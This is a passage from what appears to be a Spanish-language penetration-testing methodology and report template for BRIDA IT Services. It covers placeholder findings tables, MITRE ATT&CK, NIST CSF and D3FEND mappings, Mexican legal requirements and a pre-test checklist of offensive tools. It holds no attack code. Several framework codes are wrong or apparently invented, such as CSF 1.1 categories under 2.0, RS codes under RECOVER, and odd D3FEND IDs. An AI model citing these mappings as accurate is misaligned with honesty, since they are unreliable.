**Controles que fallaron:** [Lista de controles que deberían haber prevenido esta cadena]

---

### 5. Resumen de Vulnerabilidades

| ID | Título | Severidad | CVSS | CWE | MITRE ATT&CK | Estado |
|----|--------|-----------|------|-----|-------------|--------|
| 001 | [Título] | Crítica | 9.8 | CWE-89 | T1190 | Abierta |
| 002 | [Título] | Alta | 8.1 | CWE-79 | T1190 | Abierta |
| 003 | [Título] | Media | 5.3 | CWE-200 | T1046 | Abierta |
| ... | ... | ... | ... | ... | ... | ... |

---

### 6. Análisis de MITRE ATT&CK

| Táctica | Técnica | ID | Hallazgos Relacionados |
|---------|---------|-----|----------------------|
| Reconnaissance | Active Scanning | T1595 | HALLAZGO-003 |
| Initial Access | Exploit Public-Facing App | T1190 | HALLAZGO-001 |
| Execution | Command and Scripting | T1059 | HALLAZGO-005 |
| Persistence | Scheduled Task/Job | T1053 | HALLAZGO-008 |
| Privilege Escalation | Abuse Elevation Control | T1548 | HALLAZGO-006 |
| Credential Access | OS Credential Dumping | T1003 | HALLAZGO-007 |
| Credential Access | Brute Force | T1110 | HALLAZGO-009 |
| Credential Access | Phishing | T1566 | HALLAZGO-010 |
| Lateral Movement | Remote Services | T1021 | HALLAZGO-011 |
| Impact | Data Encrypted for Impact | T1486 | HALLAZGO-012 |

---

### 7. Análisis NIST CSF

| Función | Categoría | Hallazgos Relacionados |
|---------|-----------|----------------------|
| Identify | Asset Management | HALLAZGO-003, HALLAZGO-004 |
| Identify | Risk Assessment | HALLAZGO-001, HALLAZGO-002 |
| Protect | Identity Mgmt & Access Control | HALLAZGO-005, HALLAZGO-009 |
| Protect | Data Security | HALLAZGO-006, HALLAZGO-007 |
| Detect | Security Continuous Monitoring | HALLAZGO-003, HALLAZGO-008 |
| Respond | Response Planning | HALLAZGO-010, HALLAZGO-011 |
| Recover | Recovery Planning | HALLAZGO-012 |

---

### 8. Análisis D3FEND

| HallazGO | Técnica de ataque | Contramedida D3FEND | Descripción |
|----------|-------------------|---------------------|-------------|
| HALLAZGO-001 | SQL Injection | D3-ISVA | Input Source Validation Analysis |
| HALLAZGO-002 | XSS | D3-ISVA, D3-WAF | Input Validation + WAF |
| HALLAZGO-003 | Network Scanning | D3-NTA | Network Traffic Analysis |
| HALLAZGO-004 | Default Credentials | D3-PA | Password Analysis |
| HALLAZGO-005 | Session Hijacking | D3-SS, D3-WS | Session Analysis + Web Session Analysis |
| HALLAZGO-006 | Data in Transit | D3-DEN | Data Encryption |
| HALLAZGO-007 | Credential Dumping | D3-CA | Credential Access Protection |
| HALLAZGO-008 | Phishing | D3-MA | Mail Analysis |
| HALLAZGO-009 | Brute Force | D3-MFA, D3-CE | MFA + Configuration Enforcement |
| HALLAZGO-010 | Weak Crypto | D3-DNSA, D3-CB | DNS Analysis + Certificate Auth |
| HALLAZGO-011 | Lateral Movement | D3-NI | Network Isolation |
| HALLAZGO-012 | Unpatched Systems | D3-SPP | Software Patch Protection |

---

### 9. Plan de Remediación Priorizado

#### Inmediato (0-7 días)
1. [Remediación de HALLAZGO-001]
2. [Remediación de HALLAZGO-002]
3. [Cambio de credenciales comprometidas]

#### Corto plazo (7-30 días)
1. [Remediación de hallazgos de severidad Alta]
2. [Implementación de parches críticos]
3. [Configuración de headers de seguridad]

#### Mediano plazo (30-90 días)
1. [Remediación de hallazgos de severidad Media]
2. [Implementación de controles de detección]
3. [Programa de capacitación]

#### Largo plazo (90+ días)
1. [Remediación de hallazgos de severidad Baja]
2. [Mejoras arquitectónicas]
3. [Programa continuo de pentesting]

---

**Preparado por:**
[Nombre], [Certificaciones] — Consultor de Seguridad Senior, BRIDA IT Services

**Revisado por:**
[Nombre], [Certificaciones] — Líder de Pentesting, BRIDA IT Services

**Aprobado por:**
[Nombre] — Director de Ciberseguridad, BRIDA IT Services

---

*Este documento es CONFIDENCIAL y contiene información sensible de seguridad.*
*Su distribución está limitada a las personas autorizadas por el cliente.*
*BRIDA IT Services — Código de Ética y Confidencialidad v2.0*
```

---

## Mapeo a Frameworks

### MITRE ATT&CK — Resumen de Técnicas Utilizadas

| Fase PTES | Táctica ATT&CK | Técnicas Principales |
|-----------|---------------|---------------------|
| Pre-Engagement | — | — |
| Intelligence Gathering | Reconnaissance | T1590-T1595 (Gather Victim Info, Active Scanning) |
| Threat Modeling | — | — |
| Vulnerability Analysis | Reconnaissance | T1595 (Active Scanning) |
| Exploitation | Initial Access | T1190, T1133, T1210, T1566 |
| | Execution | T1059, T1203 |
| | Persistence | T1053, T1505, T1543 |
| | Privilege Escalation | T1548, T1055 |
| | Defense Evasion | T1562, T1484 |
| | Credential Access | T1003, T1555, T1110 |
| | Discovery | T1082, T1083, T1087, T1018, T1033, T1069 |
| | Lateral Movement | T1021, T1550, T1557 |
| | Collection | T1005, T1039, T1074 |
| | Exfiltration | T1041, T1048, T1567, T1052 |
| | Command and Control | T1071, T1105, T1219 |
| Post-Exploitation | (mismas que arriba) | (mismas que arriba) |
| Reporting | — | — |

### NIST CSF 2.0 — Mapeo Completo

| Función | Categoría | Subcategoría | Relevancia Pentest |
|---------|-----------|-------------|-------------------|
| **GOVERN** | Risk Management Strategy | GV.RM | Alto — Define enfoque de riesgo |
| | Organizational Context | GV.OC | Alto — Contexto del cliente |
| | Roles and Responsibilities | GV.RR | Alto — Define responsabilidades |
| | Policy | GV.PO | Medio — Políticas de seguridad |
| | Oversight | GV.OV | Medio — Supervisión |
| | Supply Chain Risk Mgmt | GV.SC | Bajo — Riesgo de terceros |
| **IDENTIFY** | Asset Management | ID.AM | Alto — Inventario de activos |
| | Risk Assessment | ID.RA | Crítico — Identificación de vulnerabilidades |
| | Improvement | ID.IM | Alto — Mejoras de seguridad |
| **PROTECT** | Identity Mgmt & Access Control | PR.AC | Crítico — Control de acceso |
| | Awareness and Training | PR.AT | Alto — Capacitación |
| | Data Security | PR.DS | Crítico — Protección de datos |
| | Platform Security | PR.PS | Alto — Seguridad de plataforma |
| | Technology Infrastructure Resilience | PR.IR | Medio — Resiliencia |
| **DETECT** | Continuous Monitoring | DE.CM | Crítico — Monitoreo de red/sistemas |
| | Adverse Event Analysis | DE.AE | Alto — Análisis de eventos |
| **RESPOND** | Incident Management | RS.MA | Alto — Manejo de incidentes |
| | Incident Analysis | RS.AN | Alto — Análisis forense |
| | Incident Response Reporting | RS.CO | Medio — Reporte de incidentes |
| | Incident Mitigation | RS.MI | Medio — Mitigación |
| **RECOVER** | Incident Recovery Plan Execution | RS.RP | Bajo — Plan de recuperación |
| | Incident Recovery Communication | RS.CO | Bajo — Comunicación |

### D3FEND — Contramedidas Mapeadas

| Dominio D3FEND | Técnica | Aplicación en Pentest |
|---------------|---------|---------------------|
| **Authenticate** | D3-MFA — Multi-factor Authentication | Evaluar fortaleza de autenticación |
| | D3-KB — Kerberos Authentication | Evaluar AD/Kerberos |
| | D3-CB — Certificate-based Authentication | Evaluar certificados |
| **Authorize** | D3-AC — Access Control | Evaluar permisos |
| | D3-PM — Privilege Management | Evaluar privilegios |
| **Network** | D3-NI — Network Isolation | Evaluar segmentación |
| | D3-IDS — Intrusion Detection | Evaluar detección |
| | D3-NTA — Network Traffic Analysis | Análisis de tráfico |
| | D3-WAF — Web Application Firewall | Evaluar WAF |
| **Host** | D3-EAL — Execution Allowlocking | Evaluar allowlists |
| | D3-EDR — Endpoint Detection | Evaluar EDR |
| | D3-SPP — Software Patch Protection | Evaluar parches |
| | D3-CE — Configuration Enforcement | Evaluar configuraciones |
| | D3-FR — Firmware Revision | Evaluar firmware |
| **Data** | D3-DEN — Data Encryption | Evaluar cifrado |
| | D3-DL — Data Loss Prevention | Evaluar DLP |
| | D3-DC — Data Classification | Evaluar clasificación |
| **Application** | D3-ISVA — Input Source Validation | Evaluar validación |
| | D3-SAV — Software Attribute Verification | Evaluar software |
| | D3-WS — Web Session Analysis | Evaluar sesiones |

---

## Consideraciones Legales (México)

> ⚠️ **AVISO LEGAL:** BRIDA IT Services opera dentro del marco legal mexicano. Todo penetration testing debe cumplir con la legislación aplicable.

### Marco Legal Aplicable

| Ley/Regulación | Artículo | Relevancia |
|---------------|----------|-----------|
| **Código Penal Federal** | Art. 211 bis | Acceso ilícito a sistemas informáticos (delito) |
| **LFPDPPP** | Arts. 1-69 | Protección de datos personales en posesión de privados |
| **Ley Federal de Telecomunicaciones** | Arts. 189-190 | Interceptación de comunicaciones |
| **NIST SP 800-115** | Guía técnica | Guía de testing de seguridad |
| **ISO 27001:2022** | Controles A.5-A.8 | Gestión de seguridad de la información |
| **Ley General de Ciberseguridad** | En discusión | Marco nacional de ciberseguridad |

### Requisitos Obligatorios

1. **Autorización escrita SIEMPRE:** Sin excepción, sin importar la relación con el cliente
2. **Alcance explícito:** Documentado y firmado por ambas partes
3. **Respeto a datos personales:** No acceder ni almacenar datos personales de terceros
4. **Reporte responsable:** Manejar vulnerabilidades zero-day con discreción
5. **Destrucción de datos:** Eliminar toda la información obtenida al finalizar
6. **No causar Daños:** Evitar cualquier acción que pueda dañar sistemas o datos
7. **Reporte obligatorio:** Si se encuentran indicios de actividad ilegal (explotación infantil, terrorismo), reportar a las autoridades
8. **LFPDPPP:** Cumplir con la Ley Federal de Protección de Datos Personales en Posesión de los Particulares

### Consecuencias Legales del Acceso No Autorizado

- **Código Penal Federal, Art. 211 bis:** Pena de 6 meses a 2 años de prisión y multa de 100 a 300 días de salario mínimo
- **Agravantes:** Si se obtiene información privilegiada o se causa daño
- **Responsabilidad civil:** Daños y perjuicios al afectado
- **Responsabilidad laboral:** Terminación inmediata y demanda

---

## Pre-test Checklist

### Documentación
- [ ] Scope of Work (SOW) firmado por el cliente
- [ ] NDA mutuo firmado
- [ ] Reglas de Engagement documentadas y aprobadas
- [ ] Formulario de autorización de pentesting
- [ ] Póliza de seguro de responsabilidad civil vigente
- [ ] Plan de comunicación y escalamiento
- [ ] Protocolo de manejo de datos sensibles

### Técnico
- [ ] Kali Linux actualizado (`sudo apt update && sudo apt full-upgrade -y`)
- [ ] Herramientas verificadas y funcionando:
  - [ ] Nmap
  - [ ] Metasploit Framework
  - [ ] Burp Suite
  - [ ] SQLmap
  - [ ] Hydra / Medusa
  - [ ] John the Ripper / Hashcat
  - [ ] Wireshark / tshark
  - [ ] Aircrack-ng (si aplica)
  - [ ] Nuclei / OpenVAS
- [ ] VPN configurada (si es testing remoto)
- [ ] Credenciales de acceso proporcionadas por el cliente
- [ ] Scope técnico verificado (IPs, dominios, rangos)
- [ ] Ventana de testing confirmada
- [ ] Contacto de emergencia disponible 24/7
- [ ] Disco cifrado para almacenamiento de evidencias (LUKS/Veracrypt)
- [ ] Plantillas de reporte preparadas
- [ ] Backups de configuraciones actuales (si aplica)

### Alcance
- [ ] IPs/dominios externos en scope confirmados
- [ ] IPs/dominios internos en scope confirmados
- [ ] Aplicaciones web en scope confirmadas
- [ ] Redes WiFi en scope confirmadas (si aplica)
- [ ] Personal en scope de ingeniería social confirmado (si aplica)
- [ ] Sistemas fuera de scope documentados
- [ ] Restricciones técnicas documentadas
- [ ] Criterios de detención inmediata definidos

### Comunicación
- [ ] Reunión kick-off realizada
- [ ] Canal de comunicación seguro configurado
- [ ] Contactos de emergencia intercambiados
- [ ] Frecuencia de updates acordada
- [ ] Proceso de reporte de hallazgos críticos definido

---

> **BRIDA IT Services** — Ciberseguridad que protege tu negocio
> www.bridait.com.mx | contacto@bridait.com.mx
> 
> *Este skill es para uso exclusivo de consultores autorizados de BRIDA IT Services.
> El uso no autorizado de estas técnicas es ilegal y poco ético.*
